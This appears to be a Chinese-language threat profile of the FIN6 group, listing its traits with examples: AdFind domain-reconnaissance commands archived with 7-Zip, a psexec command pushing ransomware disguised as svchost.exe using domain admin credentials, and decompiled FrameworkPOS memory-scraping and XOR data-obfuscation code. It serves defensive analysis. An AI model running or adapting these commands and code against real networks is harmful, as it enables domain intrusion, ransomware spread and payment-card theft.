# FIN6

## 特征

1. 在内网渗透中使用Adfind查询域控制器，然后使用7-Zip压缩其结果以进行渗透.

```bash
adfind.exe -f (objectcategory=person) >  ad_users.txt
//查找域中所有人员对象
adfind.exe -f (objectcategory=computer) > ad_computers.txt
//查找域中所有计算机
adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
//查找域中所有组对象
adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt
//查找域中所有子网
adfind.exe -f "(objectcategory=group)" > ad_group.txt
//查找域中所有组
adfind.exe -gcb -sc trustdmp >  ad_trustdmp.txt
//查找域中信任对象
7.exe a -mx3 ad.7z ad_*
```

2. 横向移动时会使用已有域管理员凭据分发勒索病毒.

```bash
start copy svchost.exe \\10.1.1.1\c$\windows\temp\start psexec.exe \\10.1.1.1 -u 域\域管理员 -p "密码" -d -h -r mstdc -s -accepteula -nobanner c:\windows\temp\svchost.exe
```

3. FrameworkPOS恶意软件在执行时会创建线程以构建通信协议和检索主机信息.

```C
CreateThread(0, 0, (LPTHREAD_START_ROUTINE)caller, 0, 0, 0);
//创建线程
while ( 1 )
{
  time(&v11);
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  //通过获取指定进程的信息为指定的进程、堆、模块、线程建立快照
  if ( hSnapshot == (HANDLE)-1 )
    return 0;
  pe.dwSize = 296;

  if ( !Process32First(hSnapshot, &pe) )
    break;
  do
  {
    v8 = 0;
    for ( j = 0; j < 0x14; ++j )
    {
      if ( !strcmp(pe.szExeFile, &aWininit_exe[24 * j]) || strstr(byte_592010, pe.szExeFile) )
      //将Wininit.exe列入黑名单以加快扫描内存速度
      {
        v8 = 1;
        break;
      }
    }
    if ( !v8 )
    {
      if ( pe.th32ProcessID )
      {
        dwProcessId = pe.th32ProcessID;
        v14 = 1;
        dword_592514 = 0;
        byte_59136B = 0;
        v89 = check_virtualQuery_ex(pe.th32ProcessID, 1);
        if ( v89 )
        {
          scan_memoryfor_card((int)v89);  //扫描内存
          free((int)v89);
          _sleep(200u);
        }
      }
    }
  }
  while ( Process32Next(hSnapshot, &pe) );
  if ( dword_592410 > 0 )
    _sleep(10000u s);
  CloseHandle(hSnapshot);
  time(&v15);
  v15 -= v11;
  localtime(&v15);
}
```

4. 会使用硬编码技术对被窃取的数据进行混淆，先将“AA”异或为以下字符串，然后将其转换为16进制并添加到snprintf的API调用.

```C
size_t __cdecl enc_func(char *a1, int a2)
{
  size_t result;
  unsigned int i;
  for ( len_enc = 0; ; ++len_enc )
  {
    result = strlen(a1);
    if ( len_enc >= result )
      break;
    for ( i = 0; i < 69; ++i )
    {
      if ( (unsigned __int8)a1[len_enc] == byte_42E000[i] )
      {
        a1[len_enc] = byte_42E048[i];
        break;
      }
    }
    a1[len_enc] ^= AA_key;
_snprintf((char *)(a2 + 2 * len_enc), 2u, "%.2x", (unsigned __int8)a1[len_enc]);
//将(unsigned __int8)a1[len_enc]按照“%.2x”的格式格式化为字符串并将其复制到str
  }
  return result;
}
```
